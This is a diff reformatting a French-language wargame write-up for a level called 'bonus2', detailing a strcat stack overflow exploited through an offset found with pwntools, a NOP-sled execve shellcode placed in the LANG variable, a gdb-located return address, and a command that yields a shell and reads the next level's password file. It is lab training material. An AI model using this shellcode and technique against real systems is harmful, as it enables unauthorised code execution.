@@ -1,59 +1,78 @@
-il y a une faille evidente au strcat de la fonction greetuser()
 
-vu que l'argument name va contenir 72 octets (meme si ce n'est pas exacte la logique est la meme) et va etre concatene soit avec l'un des 3:
+### Bonus 2
 
--"Hyvää päivää "
--"Goedemiddag! "
--"Hello "
+#### Etape 01 : identification de la vulnérabilité
 
-on va donc essayer de faire un overflow deja avec l'etat par defaut c'est a dire "Hello "
+Il y a une faille évidente dans `greetuser()` : la fonction utilise `strcat` pour concaténer un nom fourni par l'utilisateur à l'un des préfixes suivants selon la locale :
 
-on va deja generer un patern :
+- "Hyvää päivää "
+- "Goedemiddag! "
+- "Hello "
 
+Le buffer `name` peut contenir un grand nombre d'octets (72 dans la logique du programme), en concaténant sans contrôle, on peut provoquer un overflow
+
+ON va essayer de trouver l'offset d'écrasement pour "Hello", nous utilisons un pattern cyclique :
+
+```bash
 python -c "from pwn import *; print(cyclic(200).decode())"
+```
 
-et on va essayer  dans gdb pour trouver l'offset :
-
-(gdb) r $(python -c 'print "A" * 40') (notre patern)
-
+```gdb
+(gdb) r $(python -c 'print "A" * 40') (notre pattern)
 Program received signal SIGSEGV, Segmentation fault.
 0x08006161 in ?? ()
+```
 
-on ne trouve rien donc le depassement avec "Hello " ne sert n'est pas suffisant il va falloir tester avec les autres
+Avec le préfixe `Hello ` n'obtient pas d'offset exploitable on va tester avec les autres. En lisant le code nous voyons que le préfixe dépend de la variable d'environnement `LANG`. On change donc la locale pour tester `fi` :
 
-on va redefinir l'option switch avec export LANG=fi (lire le code)
+```bash
+export LANG=fi
+```
 
-on peut donc reessayer
-
-la on trouve quelque chose : 
-
+```gdb
 Program received signal SIGSEGV, Segmentation fault.
 0x61666161 in ?? ()
+```
 
-on va decoder le patern :
+On décode la valeur trouvée pour obtenir l'offset :
+
+```bash
 python -c "from pwn import *; print(cyclic_find(0x61666161))"
+# => 18
+```
 
-On trouve un offset de 18
+L'offset d'écrasement est `18` octets.
 
-on va mettre notre shellcode dans notre variable d'environement LANG
+#### Etape 02 : placement du shellcode et exploitation
 
+Plutôt que d'essayer de deviner précisément l'adresse, on place un shellcode dans la variable d'environnement `LANG` (on préfixe par `fi` pour conserver le comportement du programme) et on ajoute un grand sled de NOPs pour faciliter l'atterrissage :
+
+```bash
 export LANG=$(python -c 'print("fi" + "\x90" * 500 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")')
+```
 
-\x90 correspend a des NOP qui signifie pas d'instruction, passe a la suite on fait ca pour ne pas galerer a trouver precisement l'adresse du shellcode
+`\x90` est un NOP (no-op) ; le NOP-sled permet de ne pas avoir à connaître l'adresse exacte du début du shellcode.
 
+Dans `gdb` on place un breakpoint sur `main`, on exécute et on inspecte l'environnement pour trouver l'adresse du shellcode :
+
+```gdb
 (gdb) b main
-
 (gdb) r eeee eeee
-
 (gdb) x/500s environ
+0xbffffd23: "LANG=fi\220\220\220..."
+0xbffffdeb: "\220\220\220..."
+```
 
-0xbffffd23:	"LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\"...
-0xbffffdeb:	 "\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+On retient l'adresse repérée (ex. `0xbffffdeb`) et on construit l'adresse en little-endian pour l'injecter dans l'argument qui sera copié par `strcat`.
 
-je vais donc prendre l'adresse 0xbffffdeb qui donne "xeb/xfd/xff/xbf" en little edian
+Exemple de commande d'exploitation (adresse little-endian `\xeb\xfd\xff\xbf`) :
 
+```bash
 ./bonus2 $(python -c 'print "e" * 40') $(python -c 'print "e" * 18 + "\xeb\xfd\xff\xbf"')
+```
 
-Super on a un shell !
+Si tout se passe bien, on obtient un shell :
 
+```bash
 cat /home/user/bonus3/.pass
+```
